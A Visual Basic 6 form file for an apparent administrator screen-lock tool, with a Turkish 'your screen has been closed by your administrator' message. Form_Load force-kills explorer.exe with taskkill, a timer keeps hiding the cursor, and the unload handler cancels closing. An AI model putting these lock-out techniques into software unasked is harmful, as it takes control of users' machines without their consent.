VERSION 5.00
Begin VB.Form Form2 
   Appearance      =   0  'Flat
   BackColor       =   &H80000001&
   BorderStyle     =   0  'None
   Caption         =   "Form2"
   ClientHeight    =   11445
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   20400
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6439.385
   ScaleMode       =   0  'User
   ScaleWidth      =   2158.017
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3000
      Top             =   1680
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Ekranýnýz Yöneticiniz Tarafýndan Kapatýldý"
      DragMode        =   1  'Automatic
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   24
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   3675
      Left            =   4080
      TabIndex        =   0
      Top             =   5640
      Width           =   11775
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShowCursor& Lib "user32" (ByVal bshow As Long)

Private Sub Form_Load()
On Error Resume Next
Shell "taskkill /F /IM " & "explorer.exe", vbHide
Label1.Visible = False
End Sub

Public Sub form_nlad()
On Error Resume Next
Form1.Timer1.Enabled = False
Shell "explorer.exe", vbHide
ShowCursor (True)
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Cancel = True
Form1.Timer1.Enabled = False
Shell "explorer.exe", vbHide
ShowCursor (True)
End Sub
Private Sub Timer1_Timer()
On Error Resume Next
topmost = True
ShowCursor (False)
End Sub
